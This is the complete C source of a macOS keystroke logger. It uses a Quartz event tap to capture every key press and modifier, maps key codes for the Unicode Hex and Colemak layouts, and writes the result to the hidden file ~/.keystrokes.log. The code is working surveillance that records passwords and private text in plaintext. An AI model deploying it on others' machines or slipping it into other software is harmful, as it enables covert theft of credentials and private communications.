#include <Carbon/Carbon.h>
#include <stdbool.h>

#define LOG_FILENAME ".keystrokes.log"
FILE *log_file = NULL;

bool is_unicode = true;
bool is_shift = false;
bool is_control = false;
bool is_command = false;

#define UNICODE_INPUT "com.apple.keylayout.UnicodeHexInput"
char *unicode_keys[][2] = {
    {"a", "A"},  {"s", "S"}, {"d", "D"}, {"f", "F"},  {"h", "H"}, {"g", "G"},
    {"z", "Z"},  {"x", "X"}, {"c", "C"}, {"v", "V"},  {"", ""},   {"b", "B"},
    {"q", "Q"},  {"w", "W"}, {"e", "E"}, {"r", "R"},  {"y", "Y"}, {"t", "T"},
    {"1", "!"},  {"2", "@"}, {"3", "#"}, {"4", "$"},  {"6", "^"}, {"5", "%"},
    {"=", "+"},  {"9", "("}, {"7", "&"}, {"-", "-"},  {"8", "*"}, {"0", ")"},
    {"]", "}"},  {"o", "O"}, {"u", "U"}, {"[", "{"},  {"i", "I"}, {"p", "P"},
    {"⏎", "⏎"},  {"l", "L"}, {"j", "J"}, {"'", "\""}, {"k", "K"}, {";", ":"},
    {"\\", "|"}, {",", ">"}, {"/", "?"}, {"n", "N"},  {"m", "M"}, {".", "<"},
    {"⇥", "⇤"},  {" ", " "}, {"`", "~"}, {"⌫", "⌫"},  {"", ""},   {"⎋", "⎋"},
};

#define COLEMAK_INPUT "com.apple.keylayout.Colemak"
char *colemak_keys[][2] = {
    {"a", "A"},  {"r", "R"}, {"s", "S"}, {"t", "T"},  {"h", "H"}, {"d", "D"},
    {"z", "Z"},  {"x", "X"}, {"c", "C"}, {"v", "V"},  {"", ""},   {"b", "B"},
    {"q", "Q"},  {"w", "W"}, {"f", "F"}, {"p", "P"},  {"j", "J"}, {"g", "G"},
    {"1", "!"},  {"2", "@"}, {"3", "#"}, {"4", "$"},  {"6", "^"}, {"5", "%"},
    {"=", "+"},  {"9", "("}, {"7", "&"}, {"-", "-"},  {"8", "*"}, {"0", ")"},
    {"]", "}"},  {"y", "Y"}, {"l", "L"}, {"[", "{"},  {"u", "U"}, {";", ":"},
    {"⏎", "⏎"},  {"i", "I"}, {"n", "N"}, {"'", "\""}, {"e", "E"}, {"o", "O"},
    {"\\", "|"}, {",", ">"}, {"/", "?"}, {"k", "K"},  {"m", "M"}, {".", "<"},
    {"⇥", "⇤"},  {" ", " "}, {"`", "~"}, {"⌫", "⌫"},  {"", ""},   {"⎋", "⎋"},
};

char *convertKeyCode(int keyCode) {
  if (keyCode < 54) {
    if (is_unicode)
      return unicode_keys[keyCode][is_shift];
    return colemak_keys[keyCode][is_shift];
  }

  // layout insensitive
  switch ((int)keyCode) {
  case 117:
    return "⌦";
  case 123:
    return "←";
  case 124:
    return "→";
  case 125:
    return "↓";
  case 126:
    return "↑";
  }

  return "";
}

void process_flags(CGEventRef event) {
  CGEventFlags flags = CGEventGetFlags(event);

  is_shift = (kCGEventFlagMaskShift & flags);
  is_control = (kCGEventFlagMaskControl & flags);
  is_command = (kCGEventFlagMaskCommand & flags);
}

void process_layout() {
  const char *layout_name = CFStringGetCStringPtr(
      TISGetInputSourceProperty(TISCopyCurrentKeyboardInputSource(),
                                kTISPropertyInputSourceID),
      kCFStringEncodingUTF8);

  is_unicode = strcmp(layout_name, UNICODE_INPUT) == 0;
}

void log_keypress(CGEventRef event) {
  CGKeyCode keyCode =
      CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

  char *key_string = convertKeyCode(keyCode);

  if (key_string[0] == '\0') {
    fprintf(log_file, "[unregistered keycode %hu]", keyCode);
  } else {
    fprintf(log_file, "%s%s",
            is_command   ? "⌘"
            : is_control ? "⌃"
                         : "",
            key_string);
  }
  fflush(log_file);
}

CGEventRef callback(CGEventTapProxy p, CGEventType type, CGEventRef event,
                    void *r) {
  if (type == kCGEventFlagsChanged) {
    process_flags(event);
  } else if (type == kCGEventKeyDown) {
    process_layout();
    log_keypress(event);
  }

  return event;
}

void create_log_file() {
  char filepath[PATH_MAX];
  snprintf(filepath, PATH_MAX, "%s/%s", getenv("HOME"), LOG_FILENAME);

  log_file = fopen(filepath, "a");
  if (!log_file) {
    fprintf(stderr, "failed to open %s\n", filepath);
    exit(1);
  }

  printf("Logging to: %s\n", filepath);
  fflush(stdout);
}

int main(int argc, const char *argv[]) {
  create_log_file();

  CGEventMask event_mask =
      (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
  CFMachPortRef event_tap = CGEventTapCreate(
      kCGSessionEventTap, kCGHeadInsertEventTap, 0, event_mask, callback, NULL);

  if (!event_tap) {
    fprintf(stderr, "failed to create the event tap\n");
    exit(1);
  }

  CFRunLoopSourceRef run_loop_source =
      CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event_tap, 0);
  CFRunLoopAddSource(CFRunLoopGetCurrent(), run_loop_source,
                     kCFRunLoopCommonModes);

  CGEventTapEnable(event_tap, true);
  CFRunLoopRun();

  return 0;
}
